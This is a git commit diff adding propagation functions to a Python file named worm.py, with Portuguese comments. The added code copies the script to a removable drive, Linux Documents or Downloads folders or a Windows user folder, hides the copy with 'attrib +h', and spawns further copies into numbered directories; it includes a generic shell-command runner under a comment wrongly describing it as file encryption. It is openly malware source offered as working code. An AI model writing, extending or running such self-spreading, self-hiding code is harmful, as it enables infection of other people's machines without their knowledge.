41cf347ac23d9d5d68b5acf8e445eeee5d870f42
Alvaro.Veiga <alvarojoao17@gmail.com>
2024-02-13 10:37:23 -0300

    finish propagate function and copy file locate function

--- worm.py
+++ worm.py
@@ -9,12 +9,59 @@ import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess as sp
 import shutil
+import subprocess
 
+# Função para criptografar um arquivo
+def run_command(command):
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout, stderr = process.communicate()
+    return process.returncode, stdout, stderr
 
 def propagate():
+    # Copiando o worm para o diretório de inicialização do sistema operacional
     source = os.path.abspath("worm.py")
+    # Verificando o sistema operacional
     user = getpass.getuser()
 
+    # Verificando a unidade de disco
     if (os.path.isdir("E:\\")):
         destination = "E:"+ "\\worm.py"
     
+    # Verificando pasta de documentos do Linux
+    elif (os.path.isdir("/home/" + user + "/Documents")):
+        destination = "/home/" + user + "/Documents/"+"worm.py"
+
+    # Verificando pasta de downloads do Linux
+    elif (os.path.isdir("/home/" + user + "/Downloads")):
+        destination = "/home/" + user + "/Downloads/"+"worm.py"
+
+    # Verificando pasta de documentos do Windows
+    elif(os.path.isdir("C:\\")):
+        destination = "C:\\Users\\"+user+"\\worm.py"
+
+    else:
+        # Se não for possível encontrar um local para copiar o worm, será salvo na pasta atual
+        destination = os.getcwd() + "\\worm.py"
+
+    copyfile(source, destination)
+    run_command("attrib +h " + destination)
+    print("O worm será propagado para:")
+    print("Origem: " + source)
+    print("Destino: " + destination)
+
+def copy():
+    # Copiando o worm para o diretório de inicialização do sistema operacional
+    script = argv
+
+    name = str(script[0])
+
+    brutal = os.path.abspath(name)
+
+    for i in range(0, 4):
+        try:
+            directoryName = "copy"+str(i)
+            os.mkdir(directoryName)
+            shutil.copy2(brutal, directoryName)
+            source = os.path.abspath(directoryName)
+        except:
+            pass
